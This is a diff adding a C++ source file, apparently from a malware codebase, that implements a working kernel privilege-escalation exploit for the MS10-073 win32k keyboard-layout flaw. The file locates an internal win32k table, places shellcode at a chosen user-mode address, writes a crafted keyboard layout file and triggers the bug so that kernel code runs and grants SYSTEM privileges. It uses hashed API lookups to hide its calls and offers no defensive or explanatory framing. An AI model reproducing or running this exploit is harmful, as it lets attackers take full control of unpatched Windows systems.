@@ -1,0 +1,439 @@
+#include <windows.h>
+
+#include "ntdll.h"
+#include "Utils.h"
+#include "zdisasm.h"
+#include "ms10_073.h"
+#include "..\kernelshell.h"
+#include "GetApi.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "getsec.h"
+
+#define WIN_2000	1
+#define WIN_XP		2
+#define WIN_2003	3
+#define WIN_VISTA	4
+#define WIN_7		5
+
+
+
+
+
+//kernel32.dll
+#define pFlushFileBuffers			pushargEx<1, 0x2f2feeda>	
+#define pSetEndOfFile				pushargEx<1, 0x2d0d9d61>
+
+
+
+//user32.dll
+#define pSendInput					pushargEx<3,0xce1781d0>
+
+
+DWORD RvaToOffset(PIMAGE_NT_HEADERS pPE,DWORD dwRva);
+VOID FixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New);
+PIMAGE_SECTION_HEADER SearchSection(PVOID pvPEBase,LPCSTR lpName);
+PVOID MapBinary(LPCSTR lpPath,DWORD dwFileAccess,DWORD dwFileFlags,DWORD dwPageAccess,DWORD dwMapAccess,PDWORD pdwSize);
+BOOL FileWrite(LPCSTR lpName,DWORD dwFlags,LPCVOID pvBuffer,DWORD dwSize);
+
+
+
+
+BOOL FileWrite(LPCSTR lpName,DWORD dwFlags,LPCVOID pvBuffer,DWORD dwSize)
+{
+	BOOL bRet = FALSE;
+	HANDLE hFile;
+	DWORD t;
+
+	hFile = pCreateFileA(lpName,GENERIC_WRITE,FILE_SHARE_READ,NULL,dwFlags,0,0);
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		pSetFilePointer(hFile,0,0,FILE_BEGIN);
+
+		bRet = (BOOL)pWriteFile(hFile,pvBuffer,dwSize,&t,0);
+
+		pFlushFileBuffers(hFile);
+
+		pSetEndOfFile(hFile);
+
+		pCloseHandle(hFile);
+	}
+
+	return bRet;
+}
+
+
+
+/*
+PIMAGE_SECTION_HEADER SearchSection(PVOID pvPEBase,PCHAR lpName)
+{
+	PIMAGE_NT_HEADERS pNtHeaders;
+
+	pNtHeaders = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(pvPEBase);
+	if (pNtHeaders)
+	{
+		PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
+
+		for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+		{
+			if (!m_lstrcmp(lpName,(PCHAR)&pSection->Name)) return pSection;
+
+			pSection++;
+		}
+	}
+
+	return 0;
+}
+*/
+
+
+
+
+
+
+
+PDWORD ExploitWin32kKeyboardLayoutSearchNLSVKFProcTable(PVOID pMap)
+{
+	PDWORD pNlsNullProc = NULL;
+	DWORD dwLen;
+
+	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(pMap);
+	if (pPE)
+	{
+		PIMAGE_SECTION_HEADER pCodeSection = SearchSection(pMap,".text");
+		if (pCodeSection)
+		{
+			PIMAGE_SECTION_HEADER pDataSection = SearchSection(pMap,".data");
+			if (pDataSection)
+			{
+				UCHAR ucSignature[] = {0x91,0x00,0x03,0x01,0x90,0x00,0x13,0x01};
+
+				PUCHAR pPointer = (PUCHAR)pDataSection->PointerToRawData + (DWORD)pMap;
+				for (DWORD i = 0; i < pDataSection->SizeOfRawData; i++, pPointer++)
+				{
+					if (!m_memcmp(pPointer,&ucSignature,sizeof(ucSignature)))
+					{
+						DWORD dwCodeStart = pCodeSection->VirtualAddress + pPE->OptionalHeader.ImageBase;
+
+						pPointer -= 0x1000;
+						for (i = 0; i < 0x1000; i++, pPointer++)
+						{
+							if (*(PDWORD)pPointer >= dwCodeStart && *(PDWORD)pPointer < dwCodeStart + pCodeSection->SizeOfRawData)
+							{
+								if (*(PDWORD)pPointer == *(PDWORD)(pPointer + 8) && *(PDWORD)pPointer != *(PDWORD)(pPointer + 4))
+								{
+									if (*(PDWORD)pPointer != *(PDWORD)(pPointer + 12))
+									{
+										DWORD dwOffset = RvaToOffset(pPE,*(PDWORD)pPointer - pPE->OptionalHeader.ImageBase);
+										if (dwOffset)
+										{
+											PUCHAR pCode = (PUCHAR)(dwOffset + (DWORD)pMap);
+
+											for (DWORD j = 0; j < 10; j++)
+											{
+												if (*(PWORD)pCode == 0x0CC2)
+												{
+													PUCHAR pNextPointer = pPointer + 12;
+
+													for (DWORD c = 0; c < 0x1000; c++, pNextPointer++)
+													{
+														if (*(PDWORD)pNextPointer == *(PDWORD)pPointer)
+														{
+															if (*(PDWORD)pPointer != *(PDWORD)(pNextPointer - 8) && *(PDWORD)pPointer != *(PDWORD)(pNextPointer + 8))
+															{
+																pNlsNullProc = (PDWORD)pNextPointer;
+
+																break;
+															}
+														}
+													}
+
+													break;
+												}
+
+												GetInstLenght((PDWORD)pCode,&dwLen);
+												pCode += dwLen;
+											}
+										}
+									}
+								}
+							}
+
+							if (pNlsNullProc) break;
+						}
+
+						break;
+					}
+				}
+			}
+		}
+	}
+
+	return pNlsNullProc;
+}
+
+PVOID ExploitWin32kSearchNtUserLoadKeyboardLayoutEx()
+{
+	PVOID pNtUserLoadKeyboardLayoutEx = NULL;
+	PUCHAR pLoadKeyboardLayoutW = (PUCHAR)pGetProcAddress((HMODULE)pLoadLibraryA("user32.dll"),"LoadKeyboardLayoutW");
+	DWORD dwLen;
+
+	if (pLoadKeyboardLayoutW)
+	{
+		for (DWORD i = 0; i < 50; i++)
+		{
+			if (*pLoadKeyboardLayoutW == 0xE8)
+			{
+				PUCHAR pFunc = *(DWORD*)(pLoadKeyboardLayoutW + 1) + pLoadKeyboardLayoutW + 5;
+				for (DWORD j = 0; j < 200; j++)
+				{
+					if (*pFunc == 0xE8)
+					{
+						PUCHAR pFunc1 = *(DWORD*)(pFunc + 1) + pFunc + 5;
+						for (DWORD c = 0; c < 50; c++)
+						{
+							if (*(WORD*)pFunc1 == 0x15FF)
+							{
+								
+								if (**(PVOID**)(pFunc1 + 2) == pGetProcAddress(pGetModuleHandleA("ntdll.dll"),"RtlInitUnicodeString"))
+								{
+									PUCHAR pFunc2 = pFunc1 + 6;
+									for (DWORD n = 0; n < 20; n++)
+									{
+										if (*pFunc2 == 0xE8)
+										{
+											pNtUserLoadKeyboardLayoutEx = *(DWORD*)(pFunc2 + 1) + pFunc2 + 5;
+
+											break;
+										}
+
+										GetInstLenght((PDWORD)pFunc2,&dwLen);
+										pFunc2 += dwLen;
+									}
+								}
+
+								break;
+							}
+
+							GetInstLenght((PDWORD)pFunc1,&dwLen);
+							pFunc1 += dwLen;
+						}
+					}
+
+					if (pNtUserLoadKeyboardLayoutEx) break;
+
+					GetInstLenght((PDWORD)pFunc,&dwLen);
+					pFunc += dwLen;
+				}
+
+				break;
+			}
+
+			GetInstLenght((PDWORD)pLoadKeyboardLayoutW,&dwLen);
+			pLoadKeyboardLayoutW += dwLen;
+		}
+	}
+
+	return pNtUserLoadKeyboardLayoutEx;
+}
+
+unsigned char cNewKeyboardLayout[] = {
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0xe0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x2e,0x64,0x61,0x74,0x61,0x00,0x00,0x00,0xe6,0x00,0x00,0x00,
+0x60,0x01,0x00,0x00,0xe6,0x00,0x00,0x00,0x60,0x01,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x94,0x01,0x00,0x00,0x9e,0x01,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0xa6,0x01,0x00,0x00,0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x01,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x01,0x00,0x00,0x00,0xc2,0x01,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00};
+
+__declspec(naked) VOID KbdShellcode_start()
+{
+	__asm
+	{
+		mov eax,0x11111111
+		call eax
+		xor eax,eax
+		inc eax
+		retn 0x0C
+	}
+}
+
+__declspec(naked) VOID KbdShellcode_end(){__asm __emit 'K'}
+
+#define	KbdShellcode_Size	(DWORD)KbdShellcode_end - (DWORD)KbdShellcode_start
+
+BOOL ExploitWin32kKeyboardLayoutAllocShellcode(LPSTR lpLayoutFile,PVOID pvR0Func)
+{
+	CHAR SysDir[MAX_PATH];
+	CHAR Win32k[MAX_PATH];
+	BOOL bRet = FALSE;
+	DWORD dwSize;
+
+	pGetSystemDirectoryA(SysDir,RTL_NUMBER_OF(SysDir)-1);
+	pPathCombineA(Win32k,SysDir,"win32k.sys");
+
+	PVOID pMap = MapBinary(Win32k,GENERIC_READ,FILE_ATTRIBUTE_NORMAL,PAGE_READONLY,FILE_MAP_READ,&dwSize);
+	if (pMap)
+	{
+		PDWORD pNLSVKFProcTable = ExploitWin32kKeyboardLayoutSearchNLSVKFProcTable(pMap);
+		if (pNLSVKFProcTable)
+		{
+			for (BYTE bIndex = 0; bIndex <= 255; bIndex++)
+			{
+				if (pNLSVKFProcTable[bIndex] < 0x7FFF0000 && pNLSVKFProcTable[bIndex] > 0x10000)
+				{
+					MEMORY_BASIC_INFORMATION MemoryBasicInfo;
+
+					if ((DWORD)pVirtualQuery((LPCVOID)pNLSVKFProcTable[bIndex],&MemoryBasicInfo,sizeof(MemoryBasicInfo)) == sizeof(MEMORY_BASIC_INFORMATION))
+					{
+						if (MemoryBasicInfo.State == MEM_FREE)
+						{
+							DWORD dwAllocSize = 0x1000;
+							PVOID pBaseAddress = (PVOID)pNLSVKFProcTable[bIndex];
+
+							if (NT_SUCCESS(pZwAllocateVirtualMemory(pGetCurrentProcess(),&pBaseAddress,0,&dwAllocSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)))
+							{
+								if (!pIsBadWritePtr((PVOID)pNLSVKFProcTable[bIndex],KbdShellcode_Size))
+								{
+									m_memcpy((PVOID)pNLSVKFProcTable[bIndex],KbdShellcode_start,KbdShellcode_Size);
+									FixDWORD((PBYTE)pNLSVKFProcTable[bIndex],KbdShellcode_Size,0x11111111,(DWORD)pvR0Func);
+
+									CHAR chTempPath[MAX_PATH];
+
+									pGetTempPathA(sizeof(chTempPath)-1,chTempPath);
+									pGetTempFileNameA(chTempPath,NULL,0,lpLayoutFile);
+
+									cNewKeyboardLayout[0x01C3] = bIndex;
+
+									if (FileWrite(lpLayoutFile,CREATE_ALWAYS,cNewKeyboardLayout,sizeof(cNewKeyboardLayout)))
+									{
+										bRet = TRUE;
+
+										break;
+									}
+								}
+
+								pVirtualFree(pBaseAddress,0,MEM_RELEASE);
+							}
+						}
+					}
+				}
+			}
+		}
+
+		pUnmapViewOfFile(pMap);
+	}
+
+	return bRet;
+}
+
+BOOL ExploitMS10_073()
+{
+	BOOL bRet = FALSE;
+	CHAR chLayoutFile[MAX_PATH];
+
+
+	if ( ExploitWin32kKeyboardLayoutAllocShellcode(chLayoutFile,(PVOID)KernelGetSystemPrivileges) )
+	{
+		typedef NTSTATUS(NTAPI*funcNtUserLoadKeyboardLayoutEx)(HANDLE Handle,DWORD offTable,PUNICODE_STRING puszKeyboardName,HKL hKL,PUNICODE_STRING puszKLID,DWORD dwKLID,UINT Flags);
+		funcNtUserLoadKeyboardLayoutEx NtUserLoadKeyboardLayoutEx = (funcNtUserLoadKeyboardLayoutEx)ExploitWin32kSearchNtUserLoadKeyboardLayoutEx();
+		if (NtUserLoadKeyboardLayoutEx)
+		{
+			LPWSTR wszUserKLID = L"00008009";
+			UNICODE_STRING usKLID;
+			UNICODE_STRING usKeyboardName;
+			DWORD Flags	= 0x101;
+			DWORD dwKLID = 0x80098009;
+			DWORD offTable = 0x01ae0160;
+
+			usKLID.Buffer = wszUserKLID;
+			usKLID.Length = (USHORT)m_wcslen(wszUserKLID) * 2;
+			usKLID.MaximumLength = usKLID.Length + 2;
+
+			usKeyboardName.Buffer = L"";
+			usKeyboardName.Length = 0;
+			usKeyboardName.MaximumLength = 0;
+
+			
+			HKL hKL =(HKL) pGetKeyboardLayout(pGetCurrentThreadId());
+
+			HANDLE hFile = pCreateFileA(chLayoutFile,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);  
+			if (hFile != INVALID_HANDLE_VALUE)
+			{
+				INPUT Key;
+				NTSTATUS nt = STATUS_SUCCESS;
+
+				m_memset(&Key,0,sizeof(Key));
+			
+				nt = NtUserLoadKeyboardLayoutEx(hFile,offTable,&usKeyboardName,hKL,&usKLID,dwKLID,Flags);
+#ifdef _DEBUG
+				if  (! NT_SUCCESS(nt) )
+					pOutputDebugStringA("Fail NtUserLoadKeyboardLayoutEx");
+#endif
+			//	__asm int 3;
+				ActivateKeyboardLayout(hKL,Flags);
+				//__asm int 3;	
+				Key.type = 1;
+						
+				SendInput(1,&Key,sizeof(Key));
+#ifdef _DEBUG
+				int a;
+				__asm mov [a],eax
+				if  (a  )
+					pOutputDebugStringA("input was already blocked by another thread");
+#endif
+				bRet = bKernelCode;
+
+				pCloseHandle(hFile);
+			}
+		}
+
+		pDeleteFileA(chLayoutFile);
+	}
+
+	//DbgPrint(__FUNCTION__"(): %s\n",bRet ? "OK" : "failed");
+
+	return bRet;
+}
